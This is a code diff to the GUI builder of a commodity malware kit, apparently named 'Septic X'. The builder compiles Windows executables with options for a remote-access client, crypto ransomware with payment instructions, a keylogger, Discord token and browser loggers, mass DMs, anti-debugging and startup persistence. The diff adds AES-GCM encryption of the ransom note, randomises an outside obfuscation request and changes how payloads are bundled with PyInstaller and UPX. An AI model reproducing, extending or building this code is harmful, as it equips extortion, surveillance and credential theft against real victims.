@@ -4,7 +4,8 @@ from colorama import Style, Fore
 from tkinter import filedialog as fd
 from bit import SUPPORTED_CURRENCIES
 from cryptography.fernet import Fernet
-import customtkinter, subprocess, Cryptodome, websocket, threading, coincurve, requests, tkinter, shutil, base64, fade, time, bit, os
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+import customtkinter, subprocess, Cryptodome, websocket, threading, coincurve, requests, tkinter, random, shutil, base64, fade, time, bit, os
 
 customtkinter.set_appearance_mode("dark")
 
@@ -297,7 +298,6 @@ class App(customtkinter.CTk):
         self.response_label.grid(row=15, column=7, columnspan=2, sticky="ew")
 
     def start_compile(self, ransomware_config, discord_config, connection_config, misc_config, binder_widgets):
-        
         server_addr = ''
         server_key = ''
         wallet = ''
@@ -351,24 +351,12 @@ class App(customtkinter.CTk):
 
         self.response_label.configure(text='Compiling To Exe...')
 
-        self.compile([rat_client, server_addr, server_key, dynamic_webhook, webhook, cast_file, ransomware, reboots_allowed, hours, wallet, cost, currency, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin, windowed, binder_files])
+        private_key = AESGCM.generate_key(bit_length=256)
+        nonce = os.urandom(12)
 
-    @staticmethod
-    def banner():
-        print(fade.greenblue("""
-   ▄████████    ▄████████    ▄███████▄     ███      ▄█   ▄████████ ▀████    ▐████▀ 
-  ███    ███   ███    ███   ███    ███ ▀█████████▄ ███  ███    ███   ███▌   ████▀  
-  ███    █▀    ███    █▀    ███    ███    ▀███▀▀██ ███▌ ███    █▀     ███  ▐███    
-  ███         ▄███▄▄▄       ███    ███     ███   ▀ ███▌ ███           ▀███▄███▀    
-▀███████████ ▀▀███▀▀▀     ▀█████████▀      ███     ███▌ ███           ████▀██▄     
-         ███   ███    █▄    ███            ███     ███  ███    █▄    ▐███  ▀███    
-   ▄█    ███   ███    ███   ███            ███     ███  ███    ███  ▄███     ███▄  
- ▄████████▀    ██████████  ▄████▀         ▄████▀   █▀   ████████▀  ████       ███▄ 
-        """))
+        serialized_data = base64.b64encode(private_key).decode() + ':' + base64.b64encode(nonce).decode()
 
-    def compile(self, config):
-        rat_client, server_addr, server_key, dynamic_webhook, webhook, cast_file, ransomware, reboots_allowed, hours, wallet, cost, currency, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin, windowed, binder_files = config
-        key = {
+        config = {
             "SERVER_CLIENT": rat_client,
             "HOSTNAME": f'O0O000OOO00O0OOO0("{server_addr}").decode()',
             "SERVERKEY": f'O0O000OOO00O0OOO0("{server_key}").decode()',
@@ -388,16 +376,33 @@ class App(customtkinter.CTk):
             "BROWSER_LOGGER": browser,
             "ANTI_DEBUG": debug,
             "ADD_TO_STARTUP": startup,
+            "PRIV_KEY": serialized_data,
             "ADMIN": admin
         }
 
+        self.compile(config, icon, admin, windowed, binder_files, cast_file)
+
+    @staticmethod
+    def banner():
+        print(fade.greenblue("""
+   ▄████████    ▄████████    ▄███████▄     ███      ▄█   ▄████████ ▀████    ▐████▀ 
+  ███    ███   ███    ███   ███    ███ ▀█████████▄ ███  ███    ███   ███▌   ████▀  
+  ███    █▀    ███    █▀    ███    ███    ▀███▀▀██ ███▌ ███    █▀     ███  ▐███    
+  ███         ▄███▄▄▄       ███    ███     ███   ▀ ███▌ ███           ▀███▄███▀    
+▀███████████ ▀▀███▀▀▀     ▀█████████▀      ███     ███▌ ███           ████▀██▄     
+         ███   ███    █▄    ███            ███     ███  ███    █▄    ▐███  ▀███    
+   ▄█    ███   ███    ███   ███            ███     ███  ███    ███  ▄███     ███▄  
+ ▄████████▀    ██████████  ▄████▀         ▄████▀   █▀   ████████▀  ████       ███▄ 
+        """))
+
+    def compile(self, config, icon, admin, windowed, binder_files, cast_file):
         request = requests.get('https://septicx.pythonanywhere.com/api/obfuscate', json={
             "options": {
-                "base": 55000,
+                "base": 27500 + random.randint(-20000, 27500),
                 "recursion": 2,
                 "bytes": True
             },
-            "config": key,
+            "config": config,
             "hwid": self.hwid,
             "key": self.key
             
@@ -406,6 +411,23 @@ class App(customtkinter.CTk):
         if request.status_code != 200:
             self.response_label.configure(text='Error: Webserver failed to compile successfully')
             return
+        
+        token_logger = config["TOKEN_LOGGER"]
+        rat_client = config["SERVER_CLIENT"]
+        browser = config["BROWSER_LOGGER"]
+        ransomware = config["RANSOMWARE"]
+        keylogger = config["KEYLOGGER"]
+        
+
+        wallet = config["CRYPTO_WALLET"]
+        cost = config["CRYPTO_AMOUNT"]
+        currency = config["CURRENCY"]
+
+        priv_key, nonce = [base64.b64decode(part) for part in config["PRIV_KEY"].split(':')]
+
+        # Decryptor: AESGCM(base64.b64decode("PRIV_KEY".split(':')[0])).decrypt(base64.b64decode("PRIV_KEY".split(':')[1]), text, associated_data=None)
+
+        aesgcm = AESGCM(priv_key)
 
         src = request.content
 
@@ -417,8 +439,10 @@ class App(customtkinter.CTk):
         with open('src\\files\\instructions.txt', 'r+') as file:
             data = file.read()
 
-        with open('src\\temp\\instructions.txt', 'w+') as file:
-            file.write(data.replace('WALLET', wallet).replace('AMOUNT', str(cost)).replace('CURRENCY', currency))
+        with open('src\\temp\\instructions.txt', 'wb') as file:
+            formatted_data = data.replace('WALLET', wallet).replace('AMOUNT', str(cost)).replace('CURRENCY', currency).encode()
+            encrypted_data = aesgcm.encrypt(nonce, formatted_data, associated_data=None)
+            file.write(encrypted_data)
         
         binder_args = []
 
@@ -437,6 +461,7 @@ class App(customtkinter.CTk):
 
         default_imports = [
             '--hidden-import','cryptography.hazmat.primitives.asymmetric.ed25519',
+            '--hidden-import','cryptography.hazmat.primitives.asymmetric.AESGCM',
             '--hidden-import','pkg_resources.py2_warn',
             '--hidden-import','subprocess',
             '--hidden-import','win32file',
@@ -510,7 +535,7 @@ class App(customtkinter.CTk):
 
         imports = default_imports + keylogger_imports + ransomware_imports + server_imports + browser_imports + discord_imports
 
-        command = ['python', '-m', 'PyInstaller', '--noconfirm', '--windowed' if windowed else '', '--onefile', '--clean'] + imports + ['--icon', icon if icon else 'NONE', '--upx-dir', 'build\\upx', '--upx-exclude', '_uuid.pyd', '--upx-exclude', 'python3.dll', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{coincurve_path};coincurve', '--add-data', f'{cryptodome_path};Cryptodome', '--add-data', f'{bit_path};bit', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.', '--add-data' if cast_file else '', f'{dir}\\src\\temp\\cast_{filename};.' if cast_file else ''] + binder_args + [f'{dir}\\src\\output.py']
+        command = ['python', '-m', 'PyInstaller', '--noconfirm', '--windowed' if windowed else '', '--onefile', '--clean'] + imports + ['--icon', icon if icon else 'NONE', '--upx-dir', 'build\\upx', '--upx-exclude', '_uuid.pyd', '--upx-exclude', 'python3.dll', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data' if ransomware else '', f'{coincurve_path};coincurve' if ransomware else '', '--add-data' if ransomware else '', f'{cryptodome_path};Cryptodome' if ransomware else '', '--add-data' if ransomware else '', f'{bit_path};bit' if ransomware else '', '--add-data' if ransomware else '', f'{dir}\\src\\temp\\instructions.txt;.' if ransomware else '', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.', '--add-data' if cast_file else '', f'{dir}\\src\\temp\\cast_{filename};.' if cast_file else ''] + binder_args + [f'{dir}\\src\\output.py']
         for _ in range(command.count('')):
             command.remove('')
         print(command)
